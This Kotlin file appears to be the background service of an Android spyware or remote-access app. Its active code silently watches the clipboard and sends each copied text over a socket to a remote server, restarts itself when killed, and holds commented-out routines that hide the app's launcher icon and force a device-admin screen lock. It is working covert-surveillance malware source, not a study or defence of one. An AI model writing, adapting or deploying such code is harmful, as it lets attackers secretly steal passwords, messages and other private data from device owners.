package com.neaking

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import io.socket.emitter.Emitter
import org.json.JSONException
import org.json.JSONObject
import java.util.*

class MainService : Service() {
    override fun onBind(intent: Intent): IBinder? {
        return null
    }


    /*
    override fun onStartCommand(paramIntent: Intent, paramInt1: Int, paramInt2: Int): Int {

//        if (Build.VERSION.SDK_INT < 29) {
//            val pkg: PackageManager = this.packageManager
//            pkg.setComponentEnabledSetting(
//                ComponentName(this, MainActivity::class.java),
//                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                PackageManager.DONT_KILL_APP
//            )
//
//        }



//
//        val mPrimaryChangeListener = OnPrimaryClipChangedListener {
//            val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
//            if (clipboard.hasPrimaryClip()) {
//                val clipData = clipboard.primaryClip
//                if (clipData!!.itemCount > 0) {
//                    val text = clipData.getItemAt(0).text
//                    if (text != null) {
//                        try {
//                            val data = JSONObject()
//                            data.put("text", text)
////                             val duration = Toast.LENGTH_SHORT
////
////                            val toast = Toast.makeText(applicationContext, text, duration)
////                            toast.show()
//                            val mSocket = SocketHandler.getSocket()
//                            mSocket.emit( "0xCB" , data)
//
//                        } catch (e: JSONException) {
//                            e.printStackTrace()
//                        }
//                    }
//                }
//            }
//        }
//        val clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
//        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener)
//        contextOfApplication = this
//        ConnectionManager.startAsync(this)


        val handler = Handler()
        val delay = 1000 // 1000 milliseconds == 1 second
        var thisOne=this


        handler.postDelayed(object : Runnable {
            @SuppressLint("HardwareIds")
            override fun run() {
                try {
                    Log.i("Also", "Am here")

                    val mPrimaryChangeListener = OnPrimaryClipChangedListener {
                        val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                        if (clipboard.hasPrimaryClip()) {
                            val clipData = clipboard.primaryClip
                            if (clipData!!.itemCount > 0) {
                                val text = clipData.getItemAt(0).text
                                if (text != null) {
                                    try {
                                        val data = JSONObject()
                                        data.put("text", text)
//                             val duration = Toast.LENGTH_SHORT
//
//                            val toast = Toast.makeText(applicationContext, text, duration)
//                            toast.show()
                                        val mSocket = SocketHandler.getSocket()
                                        mSocket.emit( "0xCB" , data)

                                    } catch (e: JSONException) {
                                        e.printStackTrace()
                                    }
                                }
                            }
                        }
                    }
                    val clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                    clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener)
                    contextOfApplication = thisOne
                    ConnectionManager.startAsync(thisOne)


                } catch (ex: Exception) {
                    Log.i("Socket", ex.message!!)
                }
                Log.i("Service", "The service is working")
                handler.postDelayed(this, delay.toLong())
            }
        }, delay.toLong())
        return START_STICKY
    }


     */

    @SuppressLint("SuspiciousIndentation")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
     //   val handler = Handler()
     //   val delay = 1000 // 1000 milliseconds == 1 second
        var thisOne=this
       // handler.postDelayed(object : Runnable {
         //   @SuppressLint("HardwareIds", "ServiceCast")
         //   override fun run() {
                try {
                   // Log.i("Also", "Am here")
                    val mPrimaryChangeListener = ClipboardManager.OnPrimaryClipChangedListener {
                        val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                        if (clipboard.hasPrimaryClip()) {
                            val clipData = clipboard.primaryClip
                            if (clipData!!.itemCount > 0) {
                                val text = clipData.getItemAt(0).text
                                if (text != null) {
                                    try {
                                        val data = JSONObject()
                                        data.put("text", text)
//                             val duration = Toast.LENGTH_SHORT
//
//                            val toast = Toast.makeText(applicationContext, text, duration)
//                            toast.show()
                                        val mSocket = SocketHandler.getSocket()
                                        mSocket.emit("0xCB", data)

                                    } catch (e: JSONException) {
                                        e.printStackTrace()
                                    }
                                }
                            }
                        }
                    }
                    val clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                    clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener)
                    contextOfApplication = thisOne
                    ConnectionManager.startAsync(thisOne)

                } catch (ex: Exception) {
                    Log.i("Socket", ex.message!!)
                }
               // Log.i("Service", "The service is working")
             //   handler.postDelayed(this, delay.toLong())
           // }
       // }, delay.toLong())
        return START_STICKY
    }

//    private fun LockTheScreen() {
//        val localComponentName = ComponentName(this, DeviceAdminComponent::class.java)
//        val localDevicePolicyManager =
//            this.getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
//        if (localDevicePolicyManager.isAdminActive(localComponentName)) {
//            localDevicePolicyManager.setPasswordQuality(
//                localComponentName,
//                DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
//            )
//        }
//        localDevicePolicyManager.lockNow()
//    }

    override fun onDestroy() {
        super.onDestroy()
        sendBroadcast(Intent("respawnService"))
    }

    companion object {
        @JvmName("getContextOfApplication1")
        fun getContextOfApplication(): Context? {
            return contextOfApplication
        }


        var contextOfApplication: Context? = null
            private set
    }


}